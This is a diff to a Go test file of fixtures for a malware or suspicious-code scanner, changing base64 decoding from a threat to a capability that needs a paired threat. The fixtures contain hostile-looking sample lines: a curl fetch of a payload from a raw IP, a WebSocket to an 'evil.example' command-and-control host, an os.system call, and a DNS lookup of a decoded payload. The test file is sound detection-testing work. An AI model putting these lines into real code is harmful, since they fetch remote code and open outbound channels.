@@ -50,7 +50,9 @@ var corePositives = []fixture{
 	{"dynamic-import", "load.py", `mod = __import__("os")`},
 	{"suspicious-network", "beacon.sh", `curl http://185.220.101.5/payload`},
 	{"websocket", "c2.js", `const c = new WebSocket("wss://evil.example");`},
-	{"base64", "dec.py", `payload = base64.b64decode(blob)`},
+	// base64 is a capability now, so the fixture needs a threat to pair
+	// with. socket.gethostbyname trips dns-ops, which remains a threat.
+	{"base64", "dec.py", "payload = base64.b64decode(blob)\nsocket.gethostbyname(payload)"},
 	// eval-exec is a capability now, so the fixture needs a threat to pair
 	// with. socket.gethostbyname trips dns-ops, which remains a threat.
 	{"eval-exec", "run.py", "os.system(\"id\")\nsocket.gethostbyname(payload)"},
@@ -184,6 +186,7 @@ var coreNegatives = []fixture{
 	{"package-manager", "lone.sh", `pip install requests`},
 	{"shady-urls", "README.md", `Check out the demo video: https://bit.ly/3xKpL9q`},
 	{"eval-exec", "lone.py", `os.system("id")`},
+	{"base64", "lone.py", `payload = base64.b64decode(blob)`},
 
 	// Agent rules are scoped to agent paths; the same content in ordinary
 	// project files must not fire.
